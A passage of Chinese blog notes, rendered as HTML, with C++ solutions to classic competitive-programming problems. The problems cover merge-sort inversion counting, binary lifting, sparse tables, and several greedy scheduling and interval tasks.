class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (l == r) <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> mid = (l + r) / <span class="hljs-number">2</span>;<br>LL ans = <span class="hljs-built_in">merge_sort</span>(q, l, mid) + <span class="hljs-built_in">merge_sort</span>(q, mid + <span class="hljs-number">1</span>, r);<br><span class="hljs-type">int</span> i = l;<br><span class="hljs-type">int</span> j = mid + <span class="hljs-number">1</span>;<br><span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt;= mid &amp;&amp; j &lt;= r)<br>&#123;<br><span class="hljs-keyword">if</span> (q[i] &lt;= q[j]) tmp[k++] = q[i++];<br><span class="hljs-keyword">else</span><br>&#123;<br>tmp[k++] = q[j++];<br>ans += mid - i + <span class="hljs-number">1</span>;<br>&#125;<br>&#125;<br><span class="hljs-keyword">while</span> (i &lt;= mid) tmp[k++] = q[i++];<br><span class="hljs-keyword">while</span> (j &lt;= r) tmp[k++] = q[j++];<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = l, j = <span class="hljs-number">0</span>; i &lt;= r; i++) q[i] = tmp[j++];<br><span class="hljs-keyword">return</span> ans;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">while</span> (cin &gt;&gt; n)<br>&#123;<br><span class="hljs-keyword">if</span> (n == <span class="hljs-number">1</span>)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br>cout &lt;&lt; <span class="hljs-string">&quot;TAK&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-type">int</span> k1 = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> k2 = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n * n; i++)<br>&#123;<br><span class="hljs-type">int</span> x;<br>cin &gt;&gt; x;<br><span class="hljs-keyword">if</span> (x) q1[k1++] = x;<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n * n; i++)<br>&#123;<br><span class="hljs-type">int</span> x;<br>cin &gt;&gt; x;<br><span class="hljs-keyword">if</span> (x) q2[k2++] = x;<br>&#125;<br>LL ans1 = <span class="hljs-built_in">merge_sort</span>(q1, <span class="hljs-number">0</span>, k1);<br>LL ans2 = <span class="hljs-built_in">merge_sort</span>(q2, <span class="hljs-number">0</span>, k2);<br><span class="hljs-keyword">if</span> (ans1 % <span class="hljs-number">2</span> &amp;&amp; ans2 % <span class="hljs-number">2</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;TAK&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (ans1 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span> &amp;&amp; ans2 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>)<br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;TAK&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;NIE&quot;</span> &lt;&lt; endl;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="倍增">倍增</h3><h4 id="acm天才">ACM天才</h4><p>确定L，在L~N中寻找满足条件的R，二分要检验（N-L）/2区间，如果检验的T值比较小，最终右端点可能只拓展一点，可能不如从前往后枚举高效。</p><figure><img src="/2024/12/03/algorithm-enhance/1733232246916.png" alt="1733232246916"><figcaption aria-hidden="true">1733232246916</figcaption></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> LL;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">500010</span>;<br><span class="hljs-type">int</span> a[N];<br><span class="hljs-type">int</span> b[N];<br><span class="hljs-type">int</span> tmp[N];<br><span class="hljs-type">int</span> n, m;<br>LL T;<br><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">check</span><span class="hljs-params">(<span class="hljs-type">int</span> start, <span class="hljs-type">int</span> mid, <span class="hljs-type">int</span> end)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = mid; i &lt; end; i++)    <span class="hljs-comment">//建立排序数组，仍使用a回溯len/2时，会改变位置</span><br>&#123;，<br>b[i] = a[i];<br>&#125;<br><span class="hljs-built_in">sort</span>(b + mid , b + end);<br><span class="hljs-type">int</span> i = start;<br><span class="hljs-type">int</span> j = mid;<br><span class="hljs-type">int</span> k = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (i &lt; mid &amp;&amp; j &lt; end)<br>&#123;<br><span class="hljs-keyword">if</span> (b[i] &lt;= b[j]) tmp[k++] = b[i++];<br><span class="hljs-keyword">else</span> tmp[k++] = b[j++];<br>&#125;<br><span class="hljs-keyword">while</span> (i &lt; mid) tmp[k++] = b[i++];<br><span class="hljs-keyword">while</span> (j &lt; end) tmp[k++] = b[j++];<br>LL ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; m &amp;&amp; i &lt; k/<span class="hljs-number">2</span> ; i++)<br>&#123;<br>ans += <span class="hljs-built_in">LL</span>(tmp[i] - tmp[k - <span class="hljs-number">1</span> - i])*(tmp[i] - tmp[k - <span class="hljs-number">1</span> - i]);<br>&#125;<br><span class="hljs-keyword">return</span> ans &lt;= T;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> K;<br>cin &gt;&gt; K;<br><span class="hljs-keyword">while</span> (K--)<br>&#123;<br>cin &gt;&gt; n &gt;&gt; m ;<br>cin &gt;&gt; T;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cin &gt;&gt; a[i];<br>&#125;<br><span class="hljs-type">int</span> start = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> end = <span class="hljs-number">0</span>;<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">while</span> (start &lt; n)<br>&#123;<br><span class="hljs-type">int</span> len = <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (len)<br>&#123;<br><span class="hljs-keyword">if</span> (end + len &lt;= n &amp;&amp; <span class="hljs-built_in">check</span>(start, end, end + len))  <span class="hljs-comment">//左闭右开校验</span><br>&#123;<br>end += len;<br>len *= <span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> j = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = start; i &lt; end; i++)<br>&#123;<br>b[i] = tmp[j++];<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>len /= <span class="hljs-number">2</span>;<br>&#125;<br>&#125;<br>start = end;<br>ans++;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="st算法">ST算法</h4><p>应用：求解区间a[1,n]最值</p><p>F(i,j)表示从第i个数开始的2^j个数的最大值,即a[i,i+2^j-1]区间的最大值</p><p>公式：</p><p>F(i,j) = max (f(i,j-1),f(i+2^(j-1),j-1))</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n; i++) f[i][<span class="hljs-number">0</span>]=a[i][<span class="hljs-number">0</span>];<br><span class="hljs-type">int</span> t = <span class="hljs-built_in">log</span>(n)/<span class="hljs-built_in">log</span>(<span class="hljs-number">2</span>)<span class="hljs-number">+1</span><br><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j = <span class="hljs-number">1</span>; j &lt; t; j++)<br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">1</span>; i &lt;= n-(<span class="hljs-number">1</span>&lt;&lt;j)<span class="hljs-number">+1</span>; i++)<br>    &#123;<br>        f[i][j] = <span class="hljs-built_in">max</span> (f[i][j<span class="hljs-number">-1</span>],f[i+(<span class="hljs-number">1</span>&lt;&lt;(j<span class="hljs-number">-1</span>))][j<span class="hljs-number">-1</span>]);<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>求解（l,r）区间的最大值：</p><p>求小于区间长度的最大的2^k</p><p>ans = max(f(l,k),f(r-2^k+1,k))</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> k = <span class="hljs-built_in">log</span>(r-l<span class="hljs-number">+1</span>)/<span class="hljs-built_in">log</span>(<span class="hljs-number">2</span>);<br><span class="hljs-type">int</span> ans = <span class="hljs-built_in">max</span>(f[l][k],f[r-(<span class="hljs-number">1</span>&lt;&lt;k)<span class="hljs-number">+1</span>][k]);<br></code></pre></td></tr></table></figure><h3 id="贪心">贪心</h3><h4 id="防晒">防晒</h4><p>右端点从小到大排序，右端点确定需求，按需分配从小到大进行分配</p><p>如果选左端点排序，如果右端点的值很大，大的防晒会造成浪费并误用小的防晒</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br>PII cow[<span class="hljs-number">2510</span>];<br>PII spf[<span class="hljs-number">2510</span>];<br><span class="hljs-type">int</span> ans;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> c, l;<br>cin &gt;&gt; c &gt;&gt; l;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; c; i++)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br>cow[i] = <span class="hljs-built_in">make_pair</span>(y,x);<br>&#125;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; l; i++)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br>spf[i] = <span class="hljs-built_in">make_pair</span>(x, y);<br>&#125;<br><span class="hljs-built_in">sort</span>(cow, cow + c);    <span class="hljs-comment">//右端点从小到大排序，右端点确定需求</span><br><span class="hljs-built_in">sort</span>(spf, spf + l);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; c; i++)<br>&#123;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; l; j++)<br>&#123;<br><span class="hljs-keyword">if</span> (spf[j].first &lt;= cow[i].first &amp;&amp; spf[j].first &gt;= cow[i].second &amp;&amp; spf[j].second != <span class="hljs-number">0</span>)<br>&#123;<br>ans++;<br>spf[j].second--;<br><span class="hljs-keyword">break</span>;      <br>&#125;<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="畜栏预定">畜栏预定</h4><p>步骤：</p><ol type="1"><li>将所有牛按开始吃草的时间排序；</li><li>用小根堆维护当前所有畜栏的最后一头牛的吃草结束时间；</li><li>如果当前的牛可以安排在堆顶的畜栏中，则将其安排进去，否则就新建一个畜栏；</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">50010</span>;<br>pair&lt;PII, <span class="hljs-type">int</span>&gt; cow[N];<br><span class="hljs-type">int</span> heap[N];   <span class="hljs-comment">//隶属于哪里畜栏</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-type">int</span> ans;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>cin &gt;&gt; n;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br>cow[i] = <span class="hljs-built_in">make_pair</span>(<span class="hljs-built_in">make_pair</span>(x, y), i);<br>&#125;<br><span class="hljs-built_in">sort</span>(cow, cow + n);<br>priority_queue&lt;PII, vector&lt;PII&gt;, greater&lt;PII&gt;&gt; small;  <span class="hljs-comment">//畜栏,(ed,畜栏编号)</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> x = cow[i].first.first;<br><span class="hljs-type">int</span> y = cow[i].first.second;<br><span class="hljs-type">int</span> k = cow[i].second;<br><span class="hljs-keyword">if</span> (small.<span class="hljs-built_in">empty</span>() || small.<span class="hljs-built_in">top</span>().first &gt;= x)  <span class="hljs-comment">//新建畜栏</span><br>&#123;<br>PII temp = <span class="hljs-built_in">make_pair</span>(y , small.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>);<br>heap[k] = small.<span class="hljs-built_in">size</span>() + <span class="hljs-number">1</span>;<br>small.<span class="hljs-built_in">push</span>(temp);<br>ans++;<br>&#125;<br><span class="hljs-keyword">else</span>   <span class="hljs-comment">//插入，更新当前畜栏的最晚时间</span><br>&#123;<br>PII temp = small.<span class="hljs-built_in">top</span>();<br>small.<span class="hljs-built_in">pop</span>();<br>temp.first = y;<br>heap[k] = temp.second;<br>small.<span class="hljs-built_in">push</span>(temp);<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br>cout &lt;&lt; heap[i] &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="雷达设备">雷达设备</h4><p>转换为(l,r)区间，进一步转换为“最大不相交子区间数量”问题</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;cmath&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">double</span>, <span class="hljs-type">double</span>&gt; PDD;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1010</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">double</span> INF = <span class="hljs-number">1e10</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">double</span> eps = <span class="hljs-number">1e-6</span>;<br>PDD seg[N];<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-type">int</span> n, r;<br>cin &gt;&gt; n &gt;&gt; r;<br><span class="hljs-type">bool</span> success = <span class="hljs-literal">true</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">int</span> x, y;<br>cin &gt;&gt; x &gt;&gt; y;<br><span class="hljs-keyword">if</span> (y &gt; r)<br>&#123;<br>success = <span class="hljs-literal">false</span>;<br>&#125;<br>seg[i].second = x - <span class="hljs-built_in">sqrt</span>(r * r - y * y); <span class="hljs-comment">//左端点</span><br>seg[i].first = x + <span class="hljs-built_in">sqrt</span>(r * r - y * y);  <span class="hljs-comment">//右端点</span><br>&#125;<br><span class="hljs-keyword">if</span> (!success) <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;-1&quot;</span>);<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">sort</span>(seg, seg + n);<br><span class="hljs-type">int</span> ans = <span class="hljs-number">0</span>;<br><span class="hljs-type">double</span> ed = -INF;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; n; i++)<br>&#123;<br><span class="hljs-type">double</span> l = seg[i].second;<br><span class="hljs-type">double</span> r = seg[i].first;<br><span class="hljs-keyword">if</span> (l &gt; ed + eps)<br>&#123;<br>ans++;<br>ed = r;<br>&#125;<br>&#125;<br>cout &lt;&lt; ans &lt;&lt; endl;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="国王游戏">国王游戏</h4><p>将所有大臣按左右手上的数的乘积从小到大排序，得到的序列就是最优排队方案</p><p>推导参考”耍杂技的牛“</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; PII;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N = <span class="hljs-number">1010</span>;<br>PII p[N];<br><span class="hljs-type">int</span> n;<br><br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">mul</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>vector&lt;<span class="hljs-type">int</span>&gt; c;<br><span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; a.<span class="hljs-built_in">size</span>(); i++)<br>&#123;<br><span class="hljs-type">int</span> x = a[i] * b + t;<br>c.<span class="hljs-built_in">push_back</span>(x % <span class="hljs-number">10</span>);<br>t = x / <span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">while</span> (t)<br>&#123;<br>c.<span class="hljs-built_in">push_back</span>(t % <span class="hljs-number">10</span>);<br>t /= <span class="hljs-number">10</span>;<br>&#125;<br><span class="hljs-keyword">return</span> c;<br>&#125;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">div</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; a, <span class="hljs-type">int</span> b)</span></span><br><span class="hljs-function"></span>&#123;<br>vector&lt;<span class="hljs-type">int</span>&gt; c;<br><span class="hljs-type">int</span> t = <span class="hljs-number">0</span>;<br><span class="hljs-type">bool</span> isfirst = <span class="hljs-literal">true</span>;   <span class="hljs-comment">//去除前置0</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = a.<span class="hljs-built_in">size</span>() - <span class="hljs-number">1</span>; i &gt;= <span class="hljs-number">0</span>; i--)<br>&#123;<br>t = t * <span class="hljs-number">10</span> + a[i];<br><span class="hljs-type">int</span> x = t / b;<br><span class="hljs-keyword">if</span> (x || !isfirst)   <span class="hljs-comment">//x不为0或者x为0但不是第一个数，可放入答案数组</span><br>&#123;<br>isfirst = <span class="hljs-literal">false</span>;<br>c.<span class="hljs-built_in">push_back</span>(x);<br>&#125;<br>t = t % b;<br>&#125;<br><span class="hljs-built_in">reverse</span>(c.<span class="hljs-built_in">begin</span>(), c.<span class="hljs-built_in">end</span>());<br><span class="hljs-keyword">return</span> c;<br>&#125;<br><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">max_vec</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt; a, vector&lt;<span class="hljs-type">int</span>&gt; b)</span></span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span> (a.<span class="hljs-built_in">size</span>() &gt; b.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> a;<br><span class="hljs-keyword">if</span> (b.<span class="hljs-built_in">size</span>() &gt; a.<span class="hljs-built_in">size</span>()) <span class="hljs-keyword">return</span> b;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">vector</span>&lt;<span class="hljs-type">int</span>&gt;(a.<span class="hljs-built_in">rbegin</span>(), a.<span class="hljs-built_in">rend</span>()) &gt; <span class="hljs-built_in">vector</span>&lt;<span 